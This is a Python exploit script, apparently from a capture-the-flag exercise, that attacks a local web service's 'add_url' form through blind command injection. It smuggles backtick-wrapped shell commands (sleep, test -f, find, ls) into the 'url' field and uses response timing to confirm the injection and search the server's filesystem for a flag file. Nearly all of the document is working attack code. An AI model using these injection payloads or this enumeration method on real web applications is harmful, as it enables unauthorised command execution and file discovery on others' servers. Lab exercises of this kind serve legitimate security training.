import requests
import time

BASE_URL = "http://127.0.0.1:32998/add_url"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

def test_payload(payload, description, delay_threshold=1.5):
    """Test a payload with time-based detection"""
    data = f"url={payload}"
    start = time.time()
    try:
        resp = requests.post(BASE_URL, headers=headers, data=data, timeout=10)
        elapsed = time.time() - start
        return elapsed, resp.status_code, resp.text[:200], elapsed >= delay_threshold
    except requests.exceptions.Timeout:
        return 10, "TIMEOUT", "", True
    except Exception as e:
        return 0, "ERROR", str(e), False

print("[+] COMMAND INJECTION CONFIRMED - Using backticks `cmd`")
print("[+] Starting flag file location discovery...\n")

# Verify injection works first
print("[BASELINE] Testing basic sleep command...")
elapsed, status, text, triggered = test_payload("`sleep 2`", "baseline")
print(f"  Result: {elapsed:.2f}s | Sleep delay: {triggered}")

if not triggered:
    print("[!] Injection not working - aborting")
    exit()

print("  [+] Injection working - proceeding with flag location search\n")

# Test various flag file locations
flag_locations = [
    ("flag.txt", "./flag.txt (current dir)"),
    ("/app/flag.txt", "/app/flag.txt"),
    ("/flag.txt", "/flag.txt (root)"),
    ("flag", "./flag (no ext)"),
    ("/tmp/flag.txt", "/tmp/flag.txt"),
    ("../flag.txt", "../flag.txt (parent dir)"),
    ("../flag", "../flag (parent dir, no ext)"),
    ("../../flag.txt", "../../flag.txt"),
    ("flag.php", "./flag.php"),
    ("FLAG.txt", "./FLAG.txt"),
    ("/home/user/flag.txt", "/home/user/flag.txt"),
    ("/home/app/flag.txt", "/home/app/flag.txt"),
    ("/opt/flag.txt", "/opt/flag.txt"),
    ("/var/www/flag.txt", "/var/www/flag.txt"),
]

found_locations = []

print("="*60)
print("[PHASE 1] Testing specific flag file paths...")
print("="*60)

for path, desc in flag_locations:
    # Use test -f to check if file exists, sleep if true
    payload = f"`test -f {path} && sleep 2`"
    elapsed, status, text, triggered = test_payload(payload, desc)
    
    print(f"\n[TEST] {desc}")
    print(f"  Payload: {payload}")
    print(f"  Time: {elapsed:.3f}s | Delay triggered: {triggered}")
    
    if triggered:
        print(f"  [!] FILE EXISTS: {path}")
        found_locations.append(path)

# Test directory listing with find
print("\n" + "="*60)
print("[PHASE 2] Using find command to search for flag files...")
print("="*60)

find_commands = [
    ("`find . -maxdepth 2 -name 'flag*' -type f 2>/dev/null | head -1 | grep -q . && sleep 2`", 
     "Find flag* in current dir (depth 2)"),
    ("`find /app -name 'flag*' -type f 2>/dev/null | head -1 | grep -q . && sleep 2`", 
     "Find flag* in /app"),
    ("`find / -maxdepth 3 -name 'flag.txt' -type f 2>/dev/null | head -1 | grep -q . && sleep 2`", 
     "Find flag.txt in root (depth 3)"),
    ("`find /tmp -name 'flag*' -type f 2>/dev/null | head -1 | grep -q . && sleep 2`", 
     "Find flag* in /tmp"),
    ("`find /home -name 'flag*' -type f 2>/dev/null | head -1 | grep -q . && sleep 2`", 
     "Find flag* in /home"),
    ("`find /opt -name 'flag*' -type f 2>/dev/null | head -1 | grep -q . && sleep 2`", 
     "Find flag* in /opt"),
]

for payload, desc in find_commands:
    elapsed, status, text, triggered = test_payload(payload, desc)
    
    print(f"\n[TEST] {desc}")
    print(f"  Payload: {payload}")
    print(f"  Time: {elapsed:.3f}s | Delay triggered: {triggered}")
    
    if triggered:
        print(f"  [!] FLAG FILE FOUND IN SEARCH PATH!")

# Try to get current working directory
print("\n" + "="*60)
print("[PHASE 3] Determining current working directory...")
print("="*60)

cwd_tests = [
    ("`pwd`", "Print working directory (will fail but we can see)"),
    ("`pwd | tail -c 1 | xargs -I {{}} test {{}} = / && sleep 2 || sleep 0`", "Check if ends with /"),
]

# Since we can't see output, try blind path testing
print("\n[+] Testing blind path discovery...")

# List some directories to see structure
ls_tests = [
    "`ls -la 2>/dev/null | head -1 | grep -q total && sleep 2`",
    "`ls -la /app 2>/dev/null | head -1 | grep -q total && sleep 2`",
    "`ls 2>/dev/null | head -1 | grep -q . && sleep 2`",
]

for i, payload in enumerate(ls_tests):
    elapsed, status, text, triggered = test_payload(payload, f"ls test #{i+1}")
    print(f"\n[LS TEST #{i+1}] Time: {elapsed:.3f}s | Delay: {triggered}")

# Print summary
print("\n" + "="*60)
print("SUMMARY")
print("="*60)
if found_locations:
    print(f"[+] FLAG FILE CONFIRMED AT:")
    for loc in found_locations:
        print(f"    - {loc}")
else:
    print("[!] No definitive flag file location found via time-based detection")
    print("[!] Check individual test results above for any delays/triggers")
print("="*60)

